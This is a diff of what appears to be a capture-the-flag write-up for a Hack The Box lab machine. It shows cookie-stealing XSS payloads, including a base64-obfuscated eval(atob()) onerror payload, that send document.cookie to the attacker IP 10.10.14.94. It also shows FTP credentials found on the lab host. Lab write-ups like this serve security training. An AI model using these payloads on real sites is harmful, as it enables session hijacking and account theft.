@@ -34,10 +34,9 @@ report.comprezzor.htb
 - We can report a bug and could be susceptible to XSS
 
 - Tried the following XSS:
-```java
-"/><img src="http ://10.10.14.94/a?cookie=' + document.cookie + '"/>
 
-```
+`<img src="http://10.10.14.94/a?cookie=' + document.cookie + '"/>`
+
 But didn't get the cookie back:
 
 
@@ -45,16 +44,14 @@ But didn't get the cookie back:
 
 - Obfuscate the payload (base64) and use eval(atob()):
   - Using the payload:  
-```bash
-fetch("http ://10.10.14.94/"+document.cookie);
 
-```
+`fetch("http://10.10.14.94/"+document.cookie);`
+
 Full XSS evaluates to:
 
-```bash
-"/><img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC45NC8iK2RvY3VtZW50LmNvb2tpZSk7'));"/>
+`"/><img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC45NC8iK2RvY3VtZW50LmNvb2tpZSk7'));"/>`
 
-```
+
 
 ![image5](../resources/6fa851041c254681a6d5fc40997ecf1f.png)
 
@@ -201,7 +198,7 @@ So we can see Python3 is running an app.py file
 
 user='ftp_admin', passwd='u3jai8y71s2'
 
-- To connect to the ftp server (running locally) - we can use the FTP URI: ftp://username:password@hostname
+- To connect to the ftp server (running locally) - we can use the FTP URI: [ftp://username:password@hostname
 
 ftp://ftp_admin:u3jai8y71s2@ftp.local
 
